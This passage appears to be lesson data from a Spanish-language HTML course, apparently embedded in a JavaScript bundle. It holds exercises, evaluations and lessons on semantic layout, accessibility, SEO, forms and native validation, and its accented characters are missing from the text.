2.  Busca en internet 3 imgenes de cosas que te gusten (hobbies, comidas, lugares).
3.  Inserta las 3 imgenes en la pgina.
4.  **Importante:** Cada imagen debe tener un tamao controlado (por ejemplo, \`width="300"\`) para que no ocupen toda la pantalla.
5.  **Obligatorio:** Cada imagen debe tener el atributo \`alt\` describiendo qu se ve en la foto.

**Resultado Esperado:**
Tres imgenes alineadas (o una debajo de otra dependiendo del espacio) con un tamao uniforme y descripciones invisibles pero funcionales.

---

## Ejercicio 3: Enlazando el Mundo

**Objetivo:** Conectar pginas mediante enlaces absolutos y relativos.

**Consigna:**
Vamos a modificar el archivo \`perfil.html\` del Ejercicio 1.
1.  Al final de la descripcin, agrega un salto de lnea y un enlace (\`a\`) que diga "Ver mis intereses".
2.  Este enlace debe llevar al archivo \`intereses.html\` que creaste en el Ejercicio 2.
3.  Ahora abre \`intereses.html\` y agrega un enlace al principio que diga "Volver al Perfil" y lleve a \`perfil.html\`.
4.  Agrega un enlace extra en tu perfil que lleve a tu red social favorita (Instagram, Twitter, etc.) y asegrate de que se abra en una **pestaa nueva** (\`target="_blank"\`).

**Resultado Esperado:**
Un sistema de navegacin bsico donde puedes ir y volver entre "Perfil" e "Intereses", y un enlace externo que abre otra pestaa.

---

## Ejercicio 4: El Men del Restaurante

**Objetivo:** Dominar las listas ordenadas y desordenadas.

**Consigna:**
Crea un archivo \`menu.html\`. Imagina que ests haciendo la web para un restaurante.
1.  Crea una lista desordenada (\`ul\`) para las "Entradas" (Ej: Ensalada, Sopa, Empanadas).
2.  Crea una lista ordenada (\`ol\`) para los "Pasos para hacer una reserva" (1. Elegir fecha, 2. Llamar, 3. Confirmar).
3.  **Desafo:** Crea una seccin de "Platos Principales" y usa una lista anidada.
    *   Ejemplo:
        *   Pastas
            *   Ravioles
            *   Fideos
        *   Carnes
            *   Asado
            *   Pollo

**Resultado Esperado:**
Una estructura clara con vietas (puntitos) para las comidas y nmeros para los pasos de reserva.

---

## Ejercicio 5: Tabla de Posiciones

**Objetivo:** Mostrar datos complejos en una tabla estructurada.

**Consigna:**
Crea un archivo \`torneo.html\`.
Dibuja, usando cdigo HTML, una tabla de posiciones de un torneo ficticio.
1.  La tabla debe tener borde visible (\`border="1"\`).
2.  Debe tener encabezados (\`th\`) para: Equipo, Puntos, Partidos Jugados.
3.  Agrega al menos 3 filas de datos (\`tr\` y \`td\`) con equipos inventados.
4.  Usa \`<thead>\`, \`<tbody>\` y \`<tfoot>\` para organizar la tabla correctamente.

**Resultado Esperado:**
Una grilla cuadriculada con los nombres de las columnas en negrita y centrados, y los datos ordenados debajo.

---

## Ejercicio 6: Formulario de Registro

**Objetivo:** Crear una interfaz para recolectar datos del usuario.

**Consigna:**
Crea un archivo \`registro.html\`.
Disea un formulario de registro para un evento. Debe pedir:
1.  Nombre Completo (Label + Input texto).
2.  Correo Electrnico (Label + Input email).
3.  Edad (Label + Input number).
4.  Un selector de "Turno preferido" usando \`radio buttons\` (Maana / Tarde).
5.  Una casilla para aceptar "Trminos y condiciones" (\`checkbox\`).
6.  Un botn de "Registrarse".

**Resultado Esperado:**
Un formulario funcional donde puedas escribir. Los radio buttons deben permitir elegir solo una opcin a la vez (Maana O Tarde, no ambos).

---

## Ejercicio Final: Estructura de un Blog Simple

**Objetivo:** Integrar todo lo aprendido en un solo proyecto.

**Consigna:**
Crea un archivo \`blog.html\`.
Este archivo debe tener la estructura de un post de blog real:
1.  Un encabezado (\`header\`) con el ttulo del Blog y un men de navegacin (lista de enlaces).
2.  Un artculo principal (\`article\`) que contenga:
    *   Ttulo del post (\`h2\`).
    *   Una imagen ilustrativa.
    *   Diferentes prrafos de texto.
    *   Alguna frase en **negrita** o *cursiva*.
3.  Una seccin de comentarios (simulada) que sea un formulario con un \`textarea\` y un botn de "Comentar".
4.  Un pie de pgina (\`footer\`) con derechos de autor y enlaces a redes sociales.

**Resultado Esperado:**
Una pgina web completa que parece un artculo real, combinando texto, imgenes, listas, enlaces y formularios en un solo documento coherente.
`,completed:!1},{id:"html-eval-junior",title:"Evaluacin Final: Nivel Junior",level:"junior",content:`# Evaluacin de Competencias: HTML Junior

Esta evaluacin mide tu comprensin de los fundamentos de HTML5.

## Seccin 1: Preguntas Tericas (Responde brevemente)

1.  **Cul es la diferencia entre \`<head>\` y \`<body>\`?**
2.  **Para qu sirve el atributo \`alt\` en una imagen y por qu es obligatorio?**
3.  **Explica la diferencia entre una lista ordenada (\`<ol>\`) y una desordenada (\`<ul>\`).**
4.  **Qu etiqueta usaras para el ttulo principal de una pgina y cuntas veces debe aparecer?**
5.  **Qu ocurre si no cierras una etiqueta como \`<strong>\`?**

## Seccin 2: Correccin de Cdigo (Debug)

El siguiente cdigo tiene **5 errores**. Encuntralos y reescribe el cdigo corregido.

\`\`\`html
<html>
<body>
    <head><title>Mi Web</title></head>
    <h1>Bienvenido a mi sitio
    <p>Este es un prrafo en <b>negrita</p></b>
    <a target="google.com">Ir a Google</a>
    <img src="foto.jpg">
</html>
\`\`\`

## Seccin 3: Desafo Prctico "Tarjeta de Perfil"

Crea un archivo HTML que represente una tarjeta de presentacin digital.
**Requisitos:**
1.  Ttulo con tu nombre (\`h2\`).
2.  Una foto tuya o un avatar (usa una imagen de placeholder si quieres).
3.  Un prrafo corto con tu descripcin.
4.  Una lista de 3 habilidades.
5.  Un enlace a tu correo electrnico (\`mailto:\`).

## Criterios de Aprobacin

*   [ ] El cdigo valida sin errores graves en un validador HTML.
*   [ ] Todas las etiquetas estn cerradas correctamente.
*   [ ] Uso correcto de la anidacin (no cruzar etiquetas).
*   [ ] La estructura bsica (\`doctype\`, \`html\`, \`head\`, \`body\`) est presente.
*   [ ] Las imgenes tienen el atributo \`alt\`.
`,completed:!1,isProject:!0},{id:"html-ss-semantica-layout",title:"Arquitectura Semntica (Layout)",level:"semi-senior",content:`# Leccin 11: Arquitectura Semntica (Layout)

## 1. Adis a la "Div-itis"

Como Semi-Senior, tu cdigo debe hablar por s mismo. Un error de principiante es usar \`<div>\` para todo.
El navegador y Google ven un \`<div>\` como "una caja genrica sin significado".
Las etiquetas semnticas dicen: "Esto es una cabecera", "Esto es navegacin", "Esto es contenido principal".

### Comparacin visual

** Incorrecto (Nivel Junior/Principiante):**
\`\`\`html
<div class="header">
    <div class="nav">...</div>
</div>
<div class="main">...</div>
<div class="footer">...</div>
\`\`\`

** Correcto (Nivel Profesional):**
\`\`\`html
<header>
    <nav>...</nav>
</header>
<main>...</main>
<footer>...</footer>
\`\`\`

## 2. Las Etiquetas Estructurales Mayores

### \`<header>\`
No es solo para la parte superior de la pgina. Es para la cabecera de **cualquier seccin**.
*   Puede contener el logo, ttulo o navegacin.
*   **Puedes tener mltiples headers** (uno para la pgina, otro para un artculo).

### \`<nav>\`
Solo para bloques de **navegacin principal**.
*   No uses \`<nav>\` para una lista pequea de enlaces en el pie de pgina (a menos que sea muy importante).
*   Correcto: Men principal, ndice de contenido.

### \`<main>\`
El contenido **nico** y principal de esa pgina especfica.
*   **Regla de oro:** Solo debe haber **UN** \`<main>\` visible por pgina.
*   No debe incluir barras laterales, navegacin global o footers que se repiten en otras pginas.

### \`<aside>\`
Contenido **tangencial** o relacionado indirectamente.
*   Barras laterales (Sidebars).
*   Publicidad.
*   Cajas de "Tambin te puede interesar".
*   Si lo quitas, el contenido principal debera seguir teniendo sentido.

### \`<footer>\`
El pie de pgina de la web o de una seccin.
*   Copyright, enlaces legales, autor del artculo.

## 3. Ejercicio Rpido de Anlisis

Imagina un blog.
1.  La barra negra arriba con el logo es un \`<header>\`.
2.  Los enlaces "Inicio | Blog | Contacto" son un \`<nav>\`.
3.  La columna izquierda con el artculo es el \`<main>\`.
4.  La columna derecha con "Suscrbete" es un \`<aside>\`.
5.  La franja de abajo con el copyright es el \`<footer>\`.

## 4. Reto de Cdigo

Refactoriza este desastre:

\`\`\`html
<div id="top">
    <h1>Mi Sitio</h1>
    <div id="menu"> <a href="#">Home</a> </div>
</div>
<div id="centro">
    <p>Contenido importante</p>
</div>
<div id="barra-lateral">
    Anuncios...
</div>
\`\`\`

**Solucin esperada:**
Usar \`<header>\`, \`<nav>\`, \`<main>\` y \`<aside>\` reestructurando el HTML.
`,completed:!1},{id:"html-ss-semantica-contenido",title:"Section vs Article vs Div",level:"semi-senior",content:`# Leccin 12: Section vs Article vs Div

## 1. La eterna duda del desarrollador

Una de las preguntas ms comunes en entrevistas tcnicas es: *"Cul es la diferencia entre section, article y div?"*.
Saber esto distingue a un maquetador profesional.

## 2. \`<div>\`: El Contenedor Genrico

salo **solo** cuando no exista una etiqueta semntica mejor.
*   Principalmente para **estilos CSS** (agrupar cosas para ponerles flexbox, grid, color de fondo).
*   **Significado:** Ninguno.

## 3. \`<section>\`: Agrupacin Temtica

salo para agrupar contenido que comparte un **mismo tema**.
*   **Regla:** Generalmente debera tener un ttulo (\`h2\` - \`h6\`) dentro.
*   Si le puedes poner un ttulo a ese bloque, probablemente es una \`<section>\`.
*   Ejemplos: Seccin de "Nuestros Servicios", Seccin de "Testimonios", Seccin de "Contacto".

## 4. \`<article>\`: Contenido Independiente

Es una pieza de contenido que **tiene sentido por s misma** si la sacas de la web y la pones en otro lado (como en un lector de RSS o compartida en Facebook).
*   Ejemplos:
    *   Un post de un blog.
    *   Una tarjeta de producto en una tienda.
    *   Un comentario de un usuario.
    *   Un tweet incrustado.

### Puede ir un \`<article>\` dentro de un \`<article>\`?
S! Un comentario (\`article\`) dentro de un post de blog (\`article\`) es semnticamente correcto.

## 5. Cuadro Comparativo

| Etiqueta | Cundo usarla? | Ejemplo |
| :--- | :--- | :--- |
| \`<div>\` | Solo para diseo/CSS. Sin significado. | \`div.wrapper\`, \`div.column\` |
| \`<section>\` | Contenido relacionado temticamente. | \`section#team\`, \`section#services\` |
| \`<article>\` | Contenido distribuible/independiente. | \`article.blog-post\`, \`article.product-card\` |

## 6. Caso Real: Componente de Noticias

** Incorrecto:**
\`\`\`html
<div class="news-item">
    <h3>Ttulo Noticia</h3>
    <p>Resumen...</p>
</div>
\`\`\`

** Correcto:**
\`\`\`html
<article class="news-item">
    <h3>Ttulo Noticia</h3>
    <p>Resumen...</p>
</article>
\`\`\`

** Incorrecto:**
\`\`\`html
<div class="about-us">
    <h2>Sobre Nosotros</h2>
    <p>...</p>
</div>
\`\`\`

** Correcto:**
\`\`\`html
<section class="about-us">
    <h2>Sobre Nosotros</h2>
    <p>...</p>
</section>
\`\`\`
`,completed:!1},{id:"html-ss-accesibilidad",title:"Accesibilidad Web (Intro Prctica)",level:"semi-senior",content:'# Leccin 13: Accesibilidad Web (Intro Prctica)\n\n## 1. HTML para todos\n\nAccesibilidad (a11y) no es "algo extra". Es un derecho. Tu HTML debe poder ser consumido por personas ciegas (screen readers), personas con problemas motores (navegacin por teclado) y bots (Google).\n\n## 2. Textos Alternativos (`alt`)\n\nEl atributo `alt` en `<img>` es obligatorio.\n*   **Mala prctica:** `alt="imagen"`, `alt="foto.jpg"`, o dejarlo vaco si la imagen *aporta informacin*.\n*   **Buena prctica:** Describe la *funcin* o el *contenido*.\n    *   Si es decorativa (fondo): `alt=""` (vaco explcito para que el lector la ignore).\n    *   Si es funcional: `alt="Grfico de ventas subiendo un 20% en 2024"`.\n\n## 3. Labels y Formularios\n\nUn input sin label es invisible para un lector de pantalla.\n\n** Error Grave:**\n```html\n<!-- El usuario ciego escucha "Edit text, blank" -->\n<input type="text" placeholder="Tu bsqueda..."> \n```\n\n** Solucin 1 (Explcita):**\n```html\n<label for="search">Buscar:</label>\n<input type="text" id="search">\n```\n\n** Solucin 2 (Implcita/Wrapping):**\n```html\n<label>\n    Buscar:\n    <input type="text">\n</label>\n```\n\n** Solucin 3 (Solo visualmente oculta):**\nSi por diseo no quieres texto visible, usa una clase CSS `.sr-only` (screen reader only) o `aria-label`.\n```html\n<input type="text" aria-label="Buscar productos">\n```\n\n## 4. Jerarqua de Encabezados (Headings)\n\nLos usuarios de lectores de pantalla navegan saltando de `h1` a `h2` a `h3`.\n*   **NO** uses `<h2>` solo para hacer la letra grande.\n*   **NO** te saltes niveles (de `h1` a `h4`).\n*   **MANTN** un orden lgico.\n\n## 5. Botones vs Enlaces\n\n*   Te lleva a otra URL? -> **Usa `<a>`**.\n*   Ejecuta una accin (abrir men, enviar, calcular)? -> **Usa `<button>`**.\n\n**El crimen del `div` clickeable:**\n```html\n<!--  INACCESIBLE: No se puede enfocar con teclado (Tab) -->\n<div onclick="submit()">Enviar</div>\n\n<!--  ACCESIBLE: Recibe foco, se activa con Enter y Espacio -->\n<button onclick="submit()">Enviar</button>\n```\n',completed:!1},{id:"html-ss-seo-html",title:"SEO Tcnico Bsico en HTML",level:"semi-senior",content:`# Leccin 14: SEO Tcnico Bsico en HTML

## 1. Ayudando a Google a entenderte

El SEO (Search Engine Optimization) empieza en tu HTML. Si tu HTML es semnticamente pobre, Google no sabr de qu trata tu web.

## 2. Meta Etiquetas Clave (\`<head>\`)

### Title
Es el factor #1 de SEO On-Page en HTML.
\`\`\`html
<title>Zapatillas Deportivas Baratas | Tienda X</title>
\`\`\`
*   Debe ser nico por pgina.
*   Palabra clave importante al principio.

### Meta Description
Es el texto gris que aparece en la bsqueda de Google. Sirve para convencer al usuario de hacer clic (CTR).
\`\`\`html
<meta name="description" content="Compra zapatillas deportivas de las mejores marcas con envo gratuito. Ofertas limitadas.">
\`\`\`

### Viewport (Mobile Friendly)
Sin esto, Google te penaliza en mvil.
\`\`\`html
<meta name="viewport" content="width=device-width, initial-scale=1.0">
\`\`\`

## 3. Open Graph (Redes Sociales)

Controla cmo se ve tu enlace cuando se comparte en WhatsApp, Facebook, LinkedIn o Twitter.

\`\`\`html
<meta property="og:title" content="Increble Curso de HTML">
<meta property="og:description" content="Domina la web desde cero.">
<meta property="og:image" content="https://misitio.com/miniatura.jpg">
<meta property="og:url" content="https://misitio.com/curso">
\`\`\`

## 4. Canonical

Evita contenido duplicado. Si tienes \`misitio.com\` y \`misitio.com?ref=twitter\`, Google podra pensar que son dos pginas distintas con el mismo contenido (malo para SEO).

\`\`\`html
<link rel="canonical" href="https://misitio.com/">
\`\`\`

## 5. Atributos \`noindex\` y \`nofollow\`

*   **noindex**: "Google, no guardes esta pgina" (ej: pgina de admin, carrito).
    \`\`\`html
    <meta name="robots" content="noindex">
    \`\`\`
*   **nofollow**: "Google, no sigas este enlace" (ej: enlace pagado o de poca confianza).
    \`\`\`html
    <a href="http://sitio-externo.com" rel="nofollow">Link patrocinado</a>
    \`\`\`
`,completed:!1},{id:"html-ss-formularios-avanzados",title:"Formularios Avanzados",level:"semi-senior",content:`# Leccin 15: Formularios Avanzados

## 1. Fieldset y Legend

Para formularios largos, es profesional agrupar campos relacionados.

\`\`\`html
<form>
    <fieldset>
        <legend>Datos Personales</legend>
        <input type="text" placeholder="Nombre">
        <input type="text" placeholder="Apellido">
    </fieldset>

    <fieldset>
        <legend>Datos de Cuenta</legend>
        <input type="email" placeholder="Email">
        <input type="password" placeholder="Contrasea">
    </fieldset>
</form>
\`\`\`

## 2. Datalist (Autocompletado nativo)

Puedes ofrecer sugerencias sin obligar (como un select, pero permitiendo escribir algo distinto).

\`\`\`html
<label for="paises">Pas:</label>
<input list="lista-paises" id="paises" name="pais">

<datalist id="lista-paises">
    <option value="Argentina">
    <option value="Brasil">
    <option value="Chile">
    <option value="Espaa">
</datalist>
\`\`\`

## 3. Optgroup en Selects

Si usas un \`<select>\` con muchas opciones, agrpalas.

\`\`\`html
<select name="comida">
    <optgroup label="Frutas">
        <option value="manzana">Manzana</option>
        <option value="banana">Banana</option>
    </optgroup>
    <optgroup label="Verduras">
        <option value="zanahoria">Zanahoria</option>
        <option value="brocoli">Brcoli</option>
    </optgroup>
</select>
\`\`\`

## 4. Inputs de seleccin mltiple y archivos

*   **Multi-select:** \`<select multiple>\`
*   **Multi-file:** \`<input type="file" multiple accept=".pdf,.doc">\` (slo deja elegir PDFs o DOCs).
`,completed:!1},{id:"html-ss-validaciones",title:"Validaciones Nativas",level:"semi-senior",content:`# Leccin 16: Validaciones Nativas

## 1. Validacin sin JavaScript

El navegador puede hacer mucho trabajo por ti. No necesitas JS para comprobar si un email es vlido o si un campo est vaco.

## 2. Atributos de Restriccin

*   **\`required\`**: El campo es obligatorio.
    \`\`\`html
    <input type="text" required>
    \`\`\`

*   **\`type="email"\` / \`type="url"\`**: Valida formato automticamente.
    \`\`\`html
    <input type="email"> <!-- Esperar algo con @ -->
    \`\`\`

*   **\`minlength\` / \`maxlength\`**: Longitud de caracteres.
    \`\`\`html
    <input type="password" minlength="8" required>
    \`\`\`

*   **\`min\` / \`max\`**: Para nmeros y fechas.
    \`\`\`html
    <input type="number" min="1" max="100">
    <input type="date" min="2023-01-01">
    \`\`\`

*   **\`step\`**: Saltos numricos.
    \`\`\`html
    <input type="number" step="0.5"> <!-- Admite 1.5, 2.0, 2.5 -->
    \`\`\`

## 3. El atributo \`pattern\` (Regex)

Para validaciones complejas usando Expresiones Regulares.

Ejemplo: Cdigo postal de 4 dgitos.
\`\`\`html
<label>CP:</label>
<input type="text" pattern="[0-9]{4}" title="Debe ser un cdigo postal de 4 nmeros">
\`\`\`
*El atributo \`title\` se muestra si la validacin falla para ayudar al usuario.*

## 4. Estilizando validaciones (CSS)

El HTML avisa al CSS del estado.

\`\`\`css
input:invalid {
    border: 2px solid red;
}

input:valid {
    border: 2px solid green;
}

input:required {
    background-color: #fff8f8;
}
\`\`\`

## 5. Ejercicio Rpido

Crea un input para un "Nombre de Usuario" que:
1.  Sea obligatorio.
2.  Tenga entre 5 y 15 caracteres.
3.  Solo permita letras minsculas y nmeros (sin espacios). usar pattern.
4.  Si falla, que el borde se ponga rojo.

\`\`\`html
<!-- Solucin -->
<input 
    type="text" 
    required 
    minlength="5" 
    maxlength="15" 
    pattern="[a-z0-9]+" 
    placeholder="usuario123"
>
\`\`\`
`,completed:!1},{id:"html-ss-buenas-practicas-ss",title:"Buenas Prcticas Semi-Senior",level:"semi-senior",content:`# Leccin 17: Buenas Prcticas Semi-Senior

## 1. Limpieza y Consistencia

Un cdigo profesional se reconoce a simple vista.
*   **Indentacin:** Siempre 2 o 4 espacios (configura tu editor).
*   **Comillas:** Usa siempre comillas dobles \`class="btn"\` (estndar HTML) en lugar de simples.
*   **Orden de atributos:** Acostmbrate a un orden lgico.
    *   Ej: \`class\` -> \`id\` -> \`name\` -> \`data-*\` -> \`src/href\` -> \`title/alt\` -> \`aria-*\`.

## 2. Evitando estilos y scripts en lnea

** Mal:**
\`\`\`html
<p style="color: red; font-size: 20px;">Error</p>
<button onclick="alert('Hola')">Click</button>
\`\`\`

** Bien (Separacin de Conceptos):**
*   HTML = Estructura.
*   CSS (clases) = Estilo.
*   JS (EventListeners) = Comportamiento.

\`\`\`html
<p class="error-message">Error</p>
<button id="btn-saludo">Click</button>
\`\`\`

## 3. Rutas Relativas vs Absolutas

*   **Absolutas:** \`https://misitio.com/img/foto.jpg\` (Dependes del dominio).
*   **Relativas:** \`/img/foto.jpg\` (Desde la raz) o \`../img/foto.jpg\`.
*   **Consejo:** Usa rutas relativas raz (\`/\`) para recursos internos. Es ms robusto en entornos de desarrollo/produccin.

## 4. Rendimiento en Imgenes

Cargar imgenes gigantes mata tu web.
Como Semi-Senior, debes conocer \`loading="lazy"\`.

\`\`\`html
<!-- Carga perezosa: La imagen no se descarga hasta que el usuario hace scroll cerca de ella -->
<img src="foto-pesada.jpg" alt="..." loading="lazy" width="800" height="600">
\`\`\`
*Siempre define width y height para evitar saltos de diseo (CLS).*

## 5. Comentarios tiles

No comentes lo obvio. Comenta la **arquitectura**.

**Intil:**
\`\`\`html
<!-- Cierra div -->
</div>
\`\`\`

**til:**
\`\`\`html
<!-- /Fin Tarjeta de Producto -->
</article>
\`\`\`
`,completed:!1},{id:"html-ss-ejercicios-ss",title:"Ejercicios Nivel Semi-Senior",level:"semi-senior",content:`# Leccin 18: Ejercicios Nivel Semi-Senior

Aplica todo lo aprendido. No hay instrucciones paso a paso. T defines la estructura.

---

## Reto 1: Landing Page de Producto (Arquitectura)
**Objetivo:** Semntica impecable y SEO.

Crea la estructura HTML para vender un "Smartwatch".
1.  **Header:** Logo y Navegacin con enlaces ancla.
2.  **Hero Section:** Ttulo principal, imagen destacada, botn de compra (CTA).
3.  **Features (Seccin):** 3 caractersticas, cada una siendo un \`<article>\` con cono y ttulo (\`h3\`).
4.  **Tech Specs:** Una tabla (\`table\`) accesible con las especificaciones.
5.  **Reviews:** Una seccin con 2 testimonios (\`<blockquote>\` o \`<article>\`).
6.  **Footer:** Newsletter form y redes sociales.

*Requisito:* Usa etiquetas semnticas (\`section\`, \`article\`, \`figure\`, \`nav\`, \`aside\` si aplica). Incluye meta tags SEO bsicos.

---

## Reto 2: Formulario de Checkout (Validacin)
**Objetivo:** Formularios complejos y accesibles.

Crea un formulario de pago simulado.
1.  **Datos Personales:** Nombre, Email (validado).
2.  **Direccin de Envo:** Calle, Ciudad, CP (input con pattern de 4-5 nmeros), Pas (usando \`datalist\`).
3.  **Datos de Tarjeta:**
    *   Nmero (input text con pattern de 16 dgitos).
    *   Expira (mes/ao).
    *   CVC (3 dgitos).
4.  **Extras:** Checkbox "Es regalo" y "Guardar datos".
5.  Agrupa todo lgicamente usando \`<fieldset>\` y \`<legend>\`.
6.  Todos los campos obligatorios deben tener \`required\`.
7.  Usa \`placeholder\` y \`label\` correcto para todos.

---

## Reto 3: El Blog Accesible
**Objetivo:** A11y y optimizacin.

Crea el esqueleto de un post de blog optimizado.
1.  Ttulo \`h1\` descriptivo.
2.  Metadatos de publicacin: Autor y Fecha usando la etiqueta \`<time>\`.
3.  Imagen principal con \`alt\` descriptivo y \`loading="lazy"\`.
4.  Cuerpo del artculo con varios prrafos y un subttulo \`h2\`.
5.  Un cdigo de ejemplo dentro de \`<pre><code>\`.
6.  Una barra lateral \`<aside>\` con "Artculos relacionados" (\`<nav>\`).
7.  Asegrate de que no haya saltos de jerarqua en los headings.
`,completed:!1},{id:"html-eval-semisenior",title:"Evaluacin Final: Nivel Semi-Senior",level:"semi-senior",content:`# Evaluacin de Competencias: HTML Semi-Senior

Esta evaluacin mide tu capacidad para escribir HTML semntico, accesible y amigable con el SEO.

## Seccin 1: Preguntas Tericas

1.  **Define "HTML Semntico" y da 3 ejemplos de etiquetas semnticas vs no-semnticas.**
2.  **Cundo usaras \`<section>\` y cundo \`<article>\`? Da un ejemplo concreto.**
3.  **Explica cmo asociar correctamente un \`<label>\` con un \`<input>\`.**
4.  **Qu meta-etiquetas son esenciales para que una pgina se comparta bien en redes sociales?**
5.  **Cul es la diferencia entre \`GET\` y \`POST\` en un formulario HTML?**

## Seccin 2: Refactoring (De Div-Soup a Semntico)

Reescribe el siguiente bloque de cdigo usando etiquetas semnticas de HTML5 (\`header\`, \`nav\`, \`main\`, \`section\`, \`article\`, \`aside\`, \`footer\`, \`figure\`, etc.).

\`\`\`html
<div class="contenedor-noticia">
    <div class="encabezado-noticia">
        <h1>Nueva versin de HTML lanzada</h1>
        <div class="fecha">Publicado ayer</div>
    </div>
    <div class="contenido">
        <div class="imagen-wrapper">
            <img src="logo-html.png" />
            <span class="leyenda">Logo oficial</span>
        </div>
        <p>Ayer se anunci...</p>
    </div>
    <div class="comentarios">
        <h3>2 Comentarios</h3>
        <div class="comentario">Muy bueno!</div>
    </div>
</div>
\`\`\`

## Seccin 3: Desafo de Formulario Accesible

Crea el HTML para un formulario de **Registro de Usuario** que cumpla con:
1.  **Nombre de Usuario:** Obligatorio, mnimo 4 caracteres.
2.  **Email:** Validacin nativa de formato de correo.
3.  **Contrasea:** Campo oculto, obligatorio.
4.  **Pas de Origen:** Una lista desplegable (\`select\`).
5.  **Trminos y Condiciones:** Un checkbox que deba marcarse obligatoriamente para enviar el formulario.
6.  **Botn de Envo:** Un botn con texto "Crear Cuenta".

*Restriccin:* No uses CSS ni JS. La validacin debe ser nativa del navegador.

## Criterios de Aprobacin

*   [ ] Diferenciacin clara y correcta entre \`<section>\` y \`<article>\`.
*   [ ] Formularios 100% accesibles (todos los inputs tienen labels asociados).
*   [ ] Uso de atributos de validacin HTML5 (\`required\`, \`type\`, \`minlength\`).
*   [ ] Ausencia de \`divs\` innecesarios para estructura de texto.
`,completed:!1,isProject:!0},{id:"html-senior-arquitectura-frontend",title:"HTML como Base de Arquitectura",level:"senior",content:`# Leccin 19: HTML como Base de Arquitectura

## 1. El HTML dicta el CSS y el JS

Un Arquitecto Frontend sabe que el HTML no es solo "pintar cajas". Es la **Single Source of Truth** de la estructura de la aplicacin.
Si tu HTML es defectuoso, tu CSS ser un infierno de \`!important\` y selectores anidados imposibles, y tu JS estar lleno de \`parentElement.parentElement\`.

## 2. Profundidad del DOM (DOM Depth)

*   **El Problema:** Un DOM excesivamente anidado aumenta el uso de memoria RAM y ralentiza el re-calculo de estilos (Reflow).
*   **Caso Real:** Frameworks que envuelven todo en \`div\`s innecesarios.
*   **Mtrica:** Google Lighthouse lanza advertencia si excedes 1500 nodos o 32 niveles de profundidad.

** Arquitectura Pobre:**
\`\`\`html
<div class="card-wrapper">
  <div class="card-inner">
    <div class="card-content">
      <div class="card-text">
        Texto
      </div>
    </div>
  </div>
</div>
\`\`\`

** Arquitectura Plana:**
\`\`\`html
<article class="card">
  <p class="card__text">Texto</p>
</article>
\`\`\`

## 3. Atomic Design en HTML

Al pensar en componentes (tomos, Molculas, Organismos), el HTML debe reflejar esa independencia.
Un organismo (ej: Header) no debe depender de un ID nico si planeas tener mltiples headers (ej: en un modal y en el body).

## 4. Pregunta de Entrevista Senior

> *"Por qu evitar selectores de ID \`#\` en CSS y JS vinculado a componentes reutilizables?"*

**Respuesta Esperada:**
Porque los IDs deben ser nicos en todo el DOM. Si reutilizo un componente con ID, rompo el HTML (IDs duplicados) y la especificidad del CSS se dispara, haciendo difcil sobrescribir estilos. Los IDs en HTML deben reservarse para anclas (\`href="#id"\`) y relaciones de accesibilidad (\`aria-labelledby="id"\`), no para estilos.
`,completed:!1},{id:"html-senior-accesibilidad-wcag",title:"Accesibilidad Avanzada (WCAG)",level:"senior",content:`# Leccin 20: Accesibilidad Avanzada (WCAG)

## 1. Ms all del \`alt\`

La accesibilidad a nivel Senior implica cumplir con WCAG 2.1 (Web Content Accessibility Guidelines) niveles AA o AAA.
No se trata solo de ciegos; es sobre navegacin por teclado, bajo contraste, reduccin de movimiento y dispositivos de entrada alternativos.

## 2. WAI-ARIA: El poder y el peligro

**Primera regla de ARIA:** No uses ARIA si HTML nativo lo soluciona.

### Roles Comunes mal usados:
*   \`role="button"\` en un \`div\` sin agregar listeners de teclado (Enter/Space).
*   \`aria-hidden="true"\` en elementos enfocables (el usuario puede llegar con tab pero el lector lo ignora -> confusin total).

## 3. Gestin del Foco (Focus Management)

En SPAs (Single Page Applications), cuando cambias de "pgina" (ruta), el foco se pierde (vuelve al body).
**Responsabilidad Senior:** Mover el foco programticamente al \`<h1>\` de la nueva pgina o al contenedor principal, para que el usuario sepa dnde est.

\`\`\`html
<h1 tabindex="-1" id="page-title">Nueva Pgina</h1>
\`\`\`
*(tabindex="-1" permite enfocarlo con JS \`el.focus()\` pero no con Tab).*

## 4. Landmarks (Hitos)

Los lectores de pantalla permiten "saltar" entre regiones. Debes garantizar que existan.

*   \`role="banner"\` (Generalmente \`<header>\`)
*   \`role="navigation"\` (\`<nav>\`)
*   \`role="main"\` (\`<main>\`)
*   \`role="contentinfo"\` (\`<footer>\`)
*   \`role="search"\` (\`<form role="search">\`)

## 5. Patrn "Skip Link"

Es un estndar de facto. Un enlace oculto visualmente que aparece al presionar Tab por primera vez.
Permite saltar el men de navegacin masivo e ir directo al contenido.

\`\`\`html
<a href="#contenido-principal" class="sr-only focus:not-sr-only">
  Saltar al contenido
</a>
...
<main id="contenido-principal">
\`\`\`
`,completed:!1},{id:"html-senior-seo-tecnico",title:"SEO Tcnico y Datos Estructurados",level:"senior",content:`# Leccin 21: SEO Tcnico y Datos Estructurados

## 1. Hablando con los Robots

El HTML es la nica garanta de comunicacin con Googlebot. JavaScript puede fallar, demorar o no ejecutarse en la fase de indexacin inicial.

## 2. JSON-LD (Schema.org)

Como Senior, no solo usas meta tags. Inyectas Datos Estructurados para ganar "Rich Snippets" (estrellitas, precios, recetas en Google).

\`\`\`html
<script type="application/ld+json">
{
  "@context": "https://schema.org/",
  "@type": "Product",
  "name": "Zapatillas Runner X",
  "image": "https://sitio.com/foto.jpg",
  "brand": {
    "@type": "Brand",
    "name": "MarcaTop"
  },
  "offers": {
    "@type": "Offer",
    "priceCurrency": "USD",
    "price": "199.00",
    "availability": "https://schema.org/InStock"
  }
}
<\/script>
\`\`\`
*Esto va en el HTML, no es visible para el usuario, pero es oro puro para SEO.*

## 3. SEO Internacional (Hreflang)

Si tu sitio tiene versiones en varios idiomas, debes decrselo a Google en el HTML.

\`\`\`html
<link rel="alternate" hreflang="es" href="https://sitio.com/es/" />
<link rel="alternate" hreflang="en" href="https://sitio.com/en/" />
<link rel="alternate" hreflang="x-default" href="https://sitio.com/" />
\`\`\`

## 4. Open Graph al detalle

No solo \`og:image\`.
*   \`og:type\`: \`website\`, \`article\`, \`video.movie\`.
*   \`twitter:card\`: \`summary_large_image\` para destacar ms en Twitter.

## 5. Desafo Tcnico
Audita una pgina. Si ves que el ttulo \`<h1>\` cambia dinmicamente con JS despus de 3 segundos... Google lo indexa?
**Respuesta:** Probablemente s en la segunda pasada (rendering), pero pierdes el crawl budget y la inmediatez. **Solucin:** Server Side Rendering (SSR) del \`<h1>\`.
